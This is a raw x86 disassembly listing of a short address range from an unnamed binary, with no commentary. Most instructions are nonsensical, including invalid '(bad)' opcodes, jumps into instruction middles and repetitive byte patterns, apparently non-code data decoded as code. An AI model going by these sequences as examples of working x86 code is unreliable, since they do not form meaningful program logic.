  42c74a:	inc    ebp
  42c74b:	inc    ecx
  42c74c:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  42c752:	push   edi
  42c753:	and    al,0x51
  42c755:	mov    edx,0x7be0833
  42c75a:	jb     0x42c756
  42c75c:	add    BYTE PTR [esi+0x30132c6],bl
  42c762:	inc    ebp
  42c763:	mov    DWORD PTR [ebx+0x8b9424],ecx
  42c769:	or     al,0x8b
  42c76b:	jl     0x42c6f8
  42c76d:	sbb    al,0x14
  42c76f:	dec    ebp
  42c770:	xor    BYTE PTR [ebp+0x1],0x8b
  42c774:	add    BYTE PTR [eax+eax*1],ah
  42c777:	xor    eax,DWORD PTR [ecx-0x75]
  42c77a:	mov    esp,DWORD PTR [esp+edx*1]
  42c77d:	add    ecx,DWORD PTR [ecx+0xca010f]
  42c783:	dec    esp
  42c784:	dec    ecx
  42c785:	adc    BYTE PTR [edx-0x15],ch
  42c788:	push   0x103039
  42c78d:	sbb    al,0x70
  42c78f:	inc    esp
  42c790:	push   0x10
  42c792:	dec    DWORD PTR [ecx+ecx*4+0x18]
  42c796:	mov    eax,edx
  42c798:	or     BYTE PTR [edi+eax*8+0x4532c69e],al
  42c79f:	mov    DWORD PTR [ebx+0x75681024],ecx
  42c7a5:	test   DWORD PTR [ebp+0x530efcf8],ecx
  42c7ab:	jge    0x42c822
  42c7ad:	xor    edi,edi
  42c7af:	pushf  
  42c7b0:	or     BYTE PTR [ebp+0x6c],dh
  42c7b3:	push   0xf88b85ff
  42c7b8:	or     BYTE PTR [ebp+0xb],dh
  42c7bb:	inc    edi
  42c7bd:	or     dh,al
  42c7bf:	jb     0x42c789
  42c7c1:	call   DWORD PTR [eax]
  42c7c3:	mov    DWORD PTR [ebp+0x24],eax
  42c7c6:	mov    ebp,ebx
  42c7c8:	adc    bh,bh
  42c7ca:	(bad)  
  42c7cb:	and    al,0xc6
  42c7cd:	lea    ebp,[edi+0x1fffc24]
  42c7d3:	or     BYTE PTR [esi+0x74],bl
  42c7d6:	ret    0x20
  42c7d9:	je     0x42c766
  42c7db:	sbb    al,0x83
  42c7dd:	mov    edi,0xe8ecfff8
  42c7e2:	mov    ecx,0xf81485ff
  42c7e7:	je     0x42c772
  42c7e9:	pop    esp
  42c7ea:	and    al,0x75
  42c7ec:	push   esi
  42c7ed:	and    al,0x8d
  42c7ef:	and    al,0xff
  42c7f1:	inc    BYTE PTR [ebx+ecx*4+0x18]
  42c7f5:	and    al,0x7c
  42c7f7:	pop    edi
  42c7f8:	adc    BYTE PTR [ebx+0x57],bl
  42c7fb:	in     eax,0x51
  42c7fd:	ret    0x33
  42c800:	mov    esi,0x187200
  42c805:	pushf  
  42c806:	inc    BYTE PTR [ecx+0x1614857c]
  42c80c:	jge    0x42c7aa
  42c80e:	mov    DWORD PTR [esp],ecx
  42c811:	(bad)  
  42c812:	cmp    DWORD PTR [eax],ebx
  42c814:	adc    BYTE PTR [eax],bl
  42c816:	push   ss
  42c817:	dec    DWORD PTR [edi+edi*8+0x18]
  42c81b:	adc    al,0xca
  42c81d:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  42c821:	into   
  42c822:	scas   eax,DWORD PTR es:[edi]
  42c823:	mov    DWORD PTR [eax+edx*2],esp
  42c826:	das    
  42c827:	inc    ebp
  42c828:	jne    0x42c7b5
  42c82a:	and    al,0x8b
  42c82c:	and    al,0x33
  42c82e:	lea    ecx,[eax]
  42c830:	jb     0x42c876
  42c832:	xor    ebp,ebx
  42c834:	adc    al,bh
  42c836:	xor    bh,bh
  42c838:	jne    0x42c87e
  42c83a:	sbb    al,0xff
  42c83c:	call   0x52a02685
  42c841:	push   ebx
  42c842:	inc    esp
  42c843:	push   ebx
  42c844:	mov    dh,0xce
  42c846:	cmp    BYTE PTR [edi+0x4aca3645],cl
  42c84c:	xchg   BYTE PTR [edi-0x34],ch
  42c84f:	cmp    eax,0x60d64b4c
  42c854:	add    al,0x0
  42c856:	add    BYTE PTR [eax],al
  42c858:	push   esp
  42c859:	cmp    bl,BYTE PTR [esi+esi*2+0x6c]
  42c85d:	popa   
  42c85e:	inc    ebp
  42c85f:	jns    0x42c8d1
  42c861:	addr16 ja 0x42c8da
  42c864:	pop    esp
  42c865:	ja     0x42c8b8
  42c867:	arpl   WORD PTR [ebx+0x49],bp
  42c86a:	jne    0x42c8dc
  42c86c:	dec    ebx
  42c86d:	dec    ecx
  42c86e:	ins    DWORD PTR es:[edi],dx
  42c86f:	addr16 dec ebp
  42c871:	pop    esp
  42c872:	push   0x6a
  42c874:	jne    0x42c8e2
  42c876:	push   0x49
  42c878:	imul   ebp,DWORD PTR [ebx+0x63],0x7a
  42c87c:	ins    BYTE PTR es:[edi],dx
  42c87d:	cs jo  0x42c8e4
  42c880:	bound  eax,QWORD PTR [eax]
  42c882:	cmp    BYTE PTR [edx+0x10],0x0
  42c886:	ins    DWORD PTR es:[edi],dx
  42c887:	das    
  42c888:	adc    BYTE PTR [eax],al
  42c88a:	jmp    0x42c8d5
  42c88c:	adc    BYTE PTR [eax],al
  42c88e:	jecxz  0x42c8f0
  42c890:	adc    BYTE PTR [eax],al
  42c892:	adc    BYTE PTR [edx+0x10],dh
  42c895:	add    bl,bh
  42c897:	pop    edi
  42c898:	adc    BYTE PTR [eax],al
  42c89a:	xlat   BYTE PTR ds:[ebx]
  42c89b:	push   es
  42c89c:	adc    BYTE PTR [eax],al
  42c89e:	cwde   
  42c89f:	add    DWORD PTR [eax],edx
  42c8a1:	add    cl,al
  42c8a3:	xchg   edx,eax
  42c8a4:	inc    edx
  42c8a5:	add    ch,al
  42c8a7:	xchg   edx,eax
  42c8a8:	inc    edx
  42c8a9:	add    cl,cl
  42c8ab:	xchg   edx,eax
  42c8ac:	inc    edx
  42c8ad:	add    ch,cl
  42c8af:	xchg   edx,eax
  42c8b0:	inc    edx
  42c8b1:	add    cl,dl
  42c8b3:	xchg   edx,eax
  42c8b4:	inc    edx
  42c8b5:	add    ch,dl
  42c8b7:	xchg   edx,eax
  42c8b8:	inc    edx
  42c8b9:	add    cl,bl
  42c8bb:	xchg   edx,eax
  42c8bc:	inc    edx
  42c8bd:	add    ch,bl
  42c8bf:	xchg   edx,eax
  42c8c0:	inc    edx
  42c8c1:	add    BYTE PTR [edx-0x79ffbd38],al
  42c8c7:	enter  0x42,0x8a
  42c8cb:	enter  0x42,0x8e
  42c8cf:	enter  0x42,0x92
  42c8d3:	enter  0x42,0x96
  42c8d7:	enter  0x42,0x9a
  42c8db:	enter  0x42,0x9e
  42c8df:	enter  0x42,0x0
  42c8e3:	add    BYTE PTR [eax],al
  42c8e5:	add    BYTE PTR [eax],al
  42c8e7:	add    BYTE PTR [eax],al
  42c8e9:	add    BYTE PTR [eax+eax*1],al
	...
